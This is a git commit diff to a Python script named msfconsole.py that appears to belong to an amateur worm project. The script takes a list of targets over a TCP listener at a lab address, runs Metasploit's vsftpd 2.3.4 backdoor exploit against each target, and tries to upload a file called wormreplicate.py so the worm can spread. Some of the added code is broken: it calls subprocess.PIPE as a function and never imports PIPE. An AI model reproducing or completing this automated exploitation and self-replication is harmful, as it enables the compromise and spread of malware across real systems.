1bfeb0b24f8b6a21390f2952bcf0d29832355184
peytonrayne <51815710+peytonrayne@users.noreply.github.com>
2021-07-08 20:02:54 -0400

    Update msfconsole.py

--- msfconsole.py
+++ msfconsole.py
@@ -7,19 +7,24 @@ def listener():
 	server = TCPServer(("192.168.56.108", 1337))
 	for client in server:
 		target_list = client.recv()
-		target_list = str(target_list.rstrip())
-		target_list = target_list[1:]
-		target_list = target_list.split(',')
-		target = target_list[0]
-		target = target[2:]
 
-		print(target)
-		return target
+		target_list = str(target_list.rstrip())
+
+		target_list = target_list[3:-2]
+
+		target_list = target_list.split(',')
+
+		print(target_list)
+		return target_list
 
 def generate(target):
 	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
-	subprocess.run(["msfconsole", "-q", "-x", exploit])
+	subprocess.Popen(["msfconsole", "-q", "-x", exploit], stdin=PIPE)
+	subprocess.PIPE("upload /home/peyton/Documents/Worm/wormreplicate.py /")
+	
 
 	
-target = listener()
-generate(target)
+target_list = listener()
+
+for target in target_list:
+	generate(target)
